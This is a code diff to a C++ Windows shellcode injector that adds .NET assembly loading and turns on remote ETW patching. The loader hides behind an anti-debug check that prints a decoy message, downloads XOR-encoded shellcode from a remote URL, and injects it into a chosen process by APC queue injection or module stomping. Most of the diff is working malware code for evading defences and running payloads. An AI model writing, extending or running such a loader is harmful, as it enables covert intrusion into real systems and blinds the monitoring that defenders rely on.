@@ -11,6 +11,7 @@
 #include "injector.hpp"
 #include "apc.hpp"
 #include "patch.hpp"
+#include "dotnet.hpp"
 
 
 #include <psapi.h>
@@ -104,7 +105,8 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
     hProcess = mainInjector.process(pid);
 	std::cout << "Handle for pid " << pid << ": " << hProcess << "\n";
 	std::cout << "patching etw !!\n";
-	//patchRemoteETW(hProcess);
+	patchRemoteETW(hProcess);
+	//patchRemoteAmsi(hProcess);
     rBuffer = mainInjector.vAlloc(hProcess, NULL, sizeof(moduleToInject));
     //rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
     mainInjector.wrMem(hProcess, rBuffer, (LPVOID)moduleToInject, sizeof(moduleToInject));
@@ -169,70 +171,84 @@ void moduleStomping(int pid, unsigned char* shellcode, SIZE_T shellcode_len) {
 }
 //debug antiDebug;
 int main(int argc, char* argv[]) {
+	
     if (antiDebug.checkDebug()) {
         std::cout << "Hello world !!!";
         return 0;
     };
     
+    try {
+        helper::Options opt = helperHandler.parseArgs(argc, argv);
 
-    helper::Options opt = helperHandler.parseArgs(argc, argv);
-	std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
-    if (opt.pid == 0 || opt.method.empty()) {
-        helperHandler.printHelp(argv[0]);
-        return 1;
-    }
+        std::cout << "Parsed options - PID: " << opt.pid << ", Method: " << opt.method << ", Use Remote: " << opt.useRemote << "\n";
+        if (opt.mode == "dotnet") {
+            InitDotnet(opt.filePath, false, opt.args);
+            return 0;
+        }
 
-    if (opt.method != "apc" && opt.method != "stomp") {
-        std::cout << "Invalid method\n";
-        return 1;
-    }
-
-    std::vector<unsigned char> shellcode_vector;
-	std::cout << "Init shellcode_vector\n";
-    if (opt.useRemote) {
-        if (opt.url.empty() || opt.file.empty()) {
-            std::cout << "Missing remote url/file\n";
+        if (opt.pid == 0 || opt.method.empty()) {
+            helperHandler.printHelp(argv[0]);
             return 1;
         }
-		
-        shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
-            opt.url,
-            opt.file,
-            opt.key
-        );
-        std::cout << "Downloaded bytes: " << shellcode_vector.size() << "\n";
-        std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
-    }
-    
-    else {
-        
+
+        if (opt.method != "apc" && opt.method != "stomp") {
+            std::cout << "Invalid method\n";
+            return 1;
+        }
+
+        std::vector<unsigned char> shellcode_vector;
+        std::cout << "Init shellcode_vector\n";
+        if (opt.useRemote) {
+            if (opt.url.empty() || opt.file.empty()) {
+                std::cout << "Missing remote url/file\n";
+                return 1;
+            }
+
+            shellcode_vector = helperHandler.fetchRemoteShellcodeAndDecode(
+                opt.url,
+                opt.file,
+                opt.key
+            );
+            std::cout << "Downloaded bytes: " << shellcode_vector.size() << "\n";
+            std::cout << "Decoding shellcode with key : " << (int)opt.key << "\n";
+        }
+
+        else {
 
 
-        helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
-    }
-	std::cout << "pid: " << opt.pid << "\n";
-    
 
-	process_id = opt.pid;
+            helperHandler.xor_shellcode(shellcode, shellcode_len, opt.key);
+        }
+        std::cout << "pid: " << opt.pid << "\n";
 
-    if (opt.method == "apc" && opt.useRemote) {
-        apcQueueInjection(process_id, shellcode_vector.size(), shellcode_vector.data());
-    }
-    else if (opt.method == "apc") {
-		apcQueueInjection(process_id, (SIZE_T)shellcode_len, shellcode);
-    }
-    else if (opt.method == "stomp" && opt.useRemote) {
-        
 
-        moduleStomping(process_id,
-            shellcode_vector.data(),
-            shellcode_vector.size());
-    }
-    else if(opt.method == "stomp"){
-        moduleStomping(process_id,
-            shellcode,
-            shellcode_len);
-    }
+        process_id = opt.pid;
 
-    return 0;
+        if (opt.method == "apc" && opt.useRemote) {
+            apcQueueInjection(process_id, shellcode_vector.size(), shellcode_vector.data());
+        }
+        else if (opt.method == "apc") {
+            apcQueueInjection(process_id, (SIZE_T)shellcode_len, shellcode);
+        }
+        else if (opt.method == "stomp" && opt.useRemote) {
+
+
+            moduleStomping(process_id,
+                shellcode_vector.data(),
+                shellcode_vector.size());
+        }
+        else if (opt.method == "stomp") {
+            moduleStomping(process_id,
+                shellcode,
+                shellcode_len);
+        }
+
+        return 0;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << "\n";
+        return 1;
+    }
+ 
+	
 }
